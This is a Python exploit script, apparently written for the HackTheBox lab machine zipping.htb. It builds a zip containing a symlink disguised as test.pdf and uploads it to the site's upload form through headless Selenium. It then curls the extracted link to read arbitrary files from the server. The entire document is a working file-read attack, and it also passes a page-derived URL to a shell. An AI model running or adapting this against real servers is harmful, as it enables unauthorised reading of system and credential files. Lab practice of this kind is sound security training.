import subprocess
import requests
import re
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from urllib.parse import urljoin

# Get user input for the payload file path
while True:
    payload_file_path = input("Enter the path to the payload PDF file (or 'exit' to quit): ")
    if payload_file_path.lower() == 'exit':
        break

    # Craft the payload bash script with the symlink creation
    payload_script = f"""#!/bin/bash
    rm zip.zip
    ln -s {payload_file_path} test.pdf
    zip -y zip.zip test.pdf
    """
    payload_script_path = 'payload_script.sh'
    with open(payload_script_path, 'w') as payload_script_file:
        payload_script_file.write(payload_script)

    # Run the payload script to create the zip file
    subprocess.run(['bash', payload_script_path])

    # URL of the website's upload form
    upload_url = "http://zipping.htb/upload.php"

    # Set up Firefox options and WebDriver
    firefox_options = Options()
    firefox_options.add_argument('-headless')
    firefox_options.binary_location = '/usr/bin/firefox'
    firefox_options.add_argument('--no-sandbox')
    firefox_options.add_argument('--disable-dev-shm-usage')
    firefox_options.executable_path = '/home/debjit/Downloads/geckodriver-v0.33.0-linux-aarch64/geckodriver'

    # Initialize the Firefox WebDriver
    driver = webdriver.Firefox(options=firefox_options)

    # Perform the file upload using Selenium
    driver.get(upload_url)
    upload_input = driver.find_element(By.NAME, 'zipFile')
    upload_input.send_keys('/home/debjit/zip.zip')
    submit_button = driver.find_element(By.NAME, 'submit')
    submit_button.click()

    # Retrieve the current URL after redirection
    current_url = driver.current_url

    # Fetch the page source with the response content
    response_content = driver.page_source

    # Close the WebDriver
    driver.quit()

    # Parse the HTML using BeautifulSoup to find the file URL
    soup = BeautifulSoup(response_content, 'html.parser')
    file_link = soup.find('a', href=re.compile(r'uploads/.*\.pdf'))
    if file_link:
        file_relative_url = file_link['href']
        file_absolute_url = urljoin(current_url, file_relative_url)

        # Fetch and read the content of the extracted file using 'curl'
        curl_command = f"curl {file_absolute_url}"
        curl_output = subprocess.check_output(curl_command, shell=True)
        extracted_file_content = curl_output.decode('utf-8')

        print("Extracted file content:")
        print(extracted_file_content)
    else:
        print("File URL not found in the response.")
